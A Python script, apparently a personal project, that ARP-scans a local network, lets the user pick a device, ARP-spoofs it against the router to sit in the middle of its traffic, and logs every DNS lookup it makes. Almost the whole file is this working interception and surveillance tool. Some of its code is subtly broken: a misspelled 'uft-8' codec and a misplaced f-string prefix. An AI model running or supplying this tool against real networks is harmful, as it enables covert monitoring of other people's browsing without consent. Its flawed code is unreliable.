#The DNS Sniffer 
import argparse
import threading
from colorama import Fore, Style
from time import strftime, localtime

#from mac_vendors import MAC
#from mac import s

from mac_vendor_lookup import MacLookup, VendorNotFoundError
from scapy.all import arp_mitm, sniff, DNS, srp, Ether, ARP


#Retriving The Network Information 
#CMD: netsh interface ipv4 show config 
parser = argparse.ArgumentParser(description="DNS Sniffer")
parser.add_argument('--network',help='Network to scan (e.g) "192.168.0.0/24"',required=True)
#parser.add_argument('--targetip',help='Target device you want to watch',required=True)
parser.add_argument('--iface',help='Interface to use for attack',required=True)
parser.add_argument('--routerip',help='IP of your home router',required=True)

opts = parser.parse_args(); 

def arp_scan(network,iface): 
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network), timeout=5, iface=iface)
    print(f'{Fore.RED}#################### AVAILABLE NETWORK DEVICES ##################{Style.RESET_ALL}\n')
    for i in ans: 
        mac = i.answer[ARP].hwsrc
        ip = i.answer[ARP].psrc

        try:
            vendor = MacLookup().lookup(mac)
        except VendorNotFoundError: 
            vendor = 'unrecognized device'; 
         
        print(f'{Fore.BLUE}{ip}{Style.RESET_ALL} ({mac}, {vendor})')
    return input('\nChoose a device IP: ')

class Devices: 
    def __init__(self, routerip, targetip, iface):
        self.routerip = routerip; 
        self.targetip = targetip; 
        self.iface = iface; 

        pass; 

    def mitm(self):
        while True: 
            try: 
                arp_mitm(self.routerip,self.targetip,self.iface)
            except:
                print('Ip address seems down, retrying...'); 
                continue; 
        pass; 

    def capture(self):
        sniff(iface=self.iface,prn=self.dns,filter=f'src host {self.targetip} and udp port 53')
        pass; 
    
    def dns(self, pkt):
        record = pkt[DNS].qd.qname.decode('uft-8').strip('.')
        time = strftime("%m/%d/%Y %H:%M:%S", localtime())
        print('f[{Fore.GREEN}{time} | {Fore.BLUE}{self.targetip} => {Fore.RED}{record}{Style.RESET_ALL}]')
    def watch(self): 
        t1 = threading.Thread(target=self.mitm, args=())
        t2 = threading.Thread(target=self.capture, args=())

        t1.start()
        t2.start()
        pass

if __name__ == '__main__':

    targetip = arp_scan(opts.network, opts.iface)
    if (targetip == 'exit'):
        exit('Quiting Device Scan')

    device = Devices(opts.routerip,targetip,opts.iface)

    device.watch(); 
